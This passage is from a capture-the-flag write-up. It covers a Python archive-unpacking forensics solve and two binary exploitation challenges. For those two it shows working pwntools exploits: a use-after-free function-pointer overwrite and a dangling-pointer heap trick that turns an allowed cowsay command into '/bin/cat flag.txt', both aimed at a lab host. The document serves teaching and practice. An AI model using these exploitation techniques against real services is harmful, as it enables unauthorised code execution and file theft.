5. s04yj815391d.bin
6. u2mns57n6gx0.bin
7. 8yvk2saim2r9.bin
8. crpcvzybm6ws.bin
9. v605rxg1naos.bin
10. lfomn2ld0w7u.bin
```

Using python to reconstruct gives us the flag.

```python
import gzip
import io
import re
import struct
import tarfile
import zipfile
from pathlib import Path

def extract_tar(data):
    with tarfile.open(fileobj=io.BytesIO(data), mode="r:*") as tar:
        files = [m for m in tar.getmembers() if m.isfile()]
        if len(files) != 1:
            raise ValueError("Expected one file in TAR")
        member = files[0]
        return member.name, tar.extractfile(member).read()

def read_fragments(data):
    fragments = {}
    with tarfile.open(fileobj=io.BytesIO(data), mode="r:*") as tar:
        for member in tar.getmembers():
            if not member.isfile():
                continue
            if not member.name.endswith(".data"):
                continue
            fragments[member.name] = tar.extractfile(member).read()
    return fragments

def local_filename(data):
    header = struct.unpack_from("<IHHHHHIIIHH", data, 0)
    signature = header[0]
    name_len = header[9]
    extra_len = header[10]
    if signature != 0x04034B50:
        raise ValueError("Not a ZIP local header")
    start = 30
    end = start + name_len
    name = data[start:end].decode("utf-8", errors="replace")
    compressed_size = header[7]
    payload_start = end + extra_len

    if payload_start + compressed_size > len(data):
        raise ValueError(f"Invalid fragment for {name}")
    return name

def get_central_directory(data):
    eocd_pos = data.rfind(b"PK\x05\x06")
    if eocd_pos == -1:
        return None
    eocd = struct.unpack_from("<IHHHHIIH", data, eocd_pos)
    total_entries = eocd[4]
    central_pos = data.find(b"PK\x01\x02")

    if central_pos == -1:
        raise ValueError("Central directory not found")
    entries = []
    pos = central_pos

    for _ in range(total_entries):
        fields = struct.unpack_from(
            "<IHHHHHHIIIHHHHHII",
            data,
            pos
        )

        if fields[0] != 0x02014B50:
            raise ValueError("Invalid central directory entry")
        name_len = fields[10]
        extra_len = fields[11]
        comment_len = fields[12]
        local_offset = fields[16]
        name_start = pos + 46
        name_end = name_start + name_len
        name = data[name_start:name_end].decode("utf-8",errors="replace")
        entries.append((local_offset, name))
        pos = name_end + extra_len + comment_len
    return entries


def reconstruct_zip(fragments):
    files = {}
    for fragment_name, data in fragments.items():
        name = local_filename(data)
        files[name] = data
        print(f"{fragment_name} -> {name}")
    central_entries = None

    for data in fragments.values():
        if b"PK\x05\x06" not in data:
            continue
        central_entries = get_central_directory(data)
        if central_entries:
            break
    if central_entries is None:
        raise ValueError("Could not find central directory")
    ordered = sorted(central_entries)
    print("\nFragment order:")
    for i, (offset, name) in enumerate(ordered):
        print(f"{i + 1:2d}. {name:25s} offset={offset:,}")

    expected = 0
    zip_data = bytearray()
    for offset, name in ordered:
        if offset != expected:
            raise ValueError(
                f"Wrong fragment order for {name}: "
                f"expected {expected}, got {offset}"
            )
        part = files[name]
        zip_data.extend(part)
        expected += len(part)

    print(f"\nReconstructed ZIP: {len(zip_data):,} bytes")
    with zipfile.ZipFile(io.BytesIO(zip_data)) as z:
        if z.testzip() is not None:
            raise ValueError("ZIP CRC check failed")
    print("ZIP is valid")
    return bytes(zip_data), ordered

def solve(filename):
    data = Path(filename).read_bytes()
    print("Layer 1: gzip")
    data = gzip.decompress(data)

    print("Layer 2: TAR")
    name, data = extract_tar(data)
    print(f"{name}")

    print("Layer 3: gzip")
    data = gzip.decompress(data)

    print("Layer 4: ZIP")
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        names = z.namelist()
        if len(names) != 1:
            raise ValueError("Expected one file in ZIP")
        name = names[0]
        data = z.read(name)

    print(f"{name}")

    print("Layer 5: gzip/TAR")
    data = gzip.decompress(data)
    name, data = extract_tar(data)
    print(f"{name}")
    
    print("Layer 6: fragment TAR")
    fragments = read_fragments(data)
    print(f"Found {len(fragments)} fragments")

    if not fragments:
        raise ValueError("No .data fragments found")

    reconstructed_zip, ordered = reconstruct_zip(fragments)
    print("\n[+] Reading reconstructed evidence")

    evidence = bytearray()
    with zipfile.ZipFile(io.BytesIO(reconstructed_zip)) as z:
        for _, name in ordered:
            part = z.read(name)
            evidence.extend(part)
            print(f"{name}: {len(part):,} bytes")
    print(f"\nTotal evidence: {len(evidence):,} bytes")

    pattern = rb"milanCTF26\{[^}]+\}"
    matches = re.findall(pattern, evidence)

    if not matches:
        print("Flag not found")
        return

    print("\nFlag:")
    for flag in dict.fromkeys(matches):
        print(flag.decode())

if __name__ == "__main__":
    solve("totally_not_a_zip_bomb.zip")
```
![alt text](<imgs/Screenshot (65).png>)

# UAF (pwn)

SO first we objdump
```bash
objdump -d -M intel Ultimate_Alien_Force
```

Then we did gdb

```bash
gdb -q ./Ultimate_Alien_Force
```

Inside which we did 
```bash
x/s 0x401450
```
```text
0x401450: "r"
```
```bash
x/s 0x401452
```
```text
0x401452: "flag.txt"
```
```bash
x/s 0x40145b
```
```text
0x40145b: "Failed to open flag.txt"
```
```bash
x/s 0x401473
```
```text
0x401473: "Alien stationed at %p\n"
```
```bash
x/s 0x40148a
```
```text
0x40148a: "Transformed back"
```
```bash
x/s 0x40149b
```
```text
0x40149b: "Message text: "
```

So after deleting the Alien the pointer is not cleared, the Next malloc(0x20) can reuse the same freed chunk

This is `A*24 buffer overflow` at `0x400516`

So we need to enter
```bash
1
A
2
3
```
then send `p64(0x400516) + b"A" * 24`

```python
from pwn import *

context.binary = elf = ELF("./Ultimate_Alien_Force", checksec=False)
context.log_level = "info"
p = process("./Ultimate_Alien_Force")
p.sendline(b"1")
p.sendline(b"A")
p.sendline(b"2")
p.sendline(b"3")
payload = p64(0x400516) + b"A" * 24
p.send(payload)
p.sendline(b"4")
p.interactive()
```

So clearly we get Failed to open flag.txt When running locally.
![UAF1](<imgs/Screenshot (66).png>)


Now we do the same on `nc`

```python
from pwn import *
context.arch = "amd64"
context.log_level = "info"
HOST = "192.168.78.228"
PORT = 40004
p = remote(HOST, PORT)
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Type which Alien you want to become", b"A")
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"> ", b"3")
p.sendafter(b"Message text:", p64(0x400516) + b"A" * 24)
p.sendlineafter(b"> ", b"4")
p.interactive()
```

![WAF2](<imgs/Screenshot (67).png>)


# Softshell (pwn)

```bash
checksec --file=./softshell
pwn checksec ./softshell
```

Checksum shows us 
```text
Full RELRO
Canary found
NX enabled
PIE enabled
SHSTK enabled
IBT enabled
```

Now in objdump we find `run_cmd()`

```bash
objdump -d -M intel softshell
```
```text
0000000000001b10 <run_cmd>
```
gdb shows interesting `moooo`
```bash
gdb -q ./softshell
```

x/s at that 
```bash
x/s 0x4020
```

```text
0x4020 <allowed>:       "/usr/games/cowsay moooo"
```


So we need argv[0]=/bin/cat and then argv[1]=flag.txt

`add_cmd()` and `del_arg()` 

Adding to heap and deleting from heap, makes it a dangling pointer.

Now using Python

```python
from pwn import *
HOST = "192.168.78.228"
PORT = 40003
context.arch = "amd64"
context.log_level = "info"
TARGET_FILE = "flag.txt"
io = remote(HOST, PORT)

def add(command, tag):
    io.sendlineafter(b"Choose an option >> ", b"1")
    io.sendlineafter(b"Command to add >> ", command.encode())
    io.sendlineafter(b"Tag for command >> ", tag.encode())

def remove_arg(index):
    io.sendlineafter(b"Choose an option >> ", b"5")
    io.sendlineafter(
        b"Index of command to remove arg >> ",
        str(index).encode()
    )

def run_cmd(index):
    io.sendlineafter(b"Choose an option >> ", b"4")
    io.sendlineafter(
        b"Index of command to run >> ",
        str(index).encode()
    )

add(
    "X A B",
    "TAG0"
)

add(
    "/usr/games/cowsay moooo",
    "TAG1"
)

remove_arg(1)
remove_arg(1)
remove_arg(0)
remove_arg(0)
remove_arg(0)

add(
    f"X /bin/cat {TARGET_FILE}",
    "TAG2"
)
run_cmd(1)
io.interactive()
```
Gives us the flag

![SS](<imgs/Screendhot (68).png>)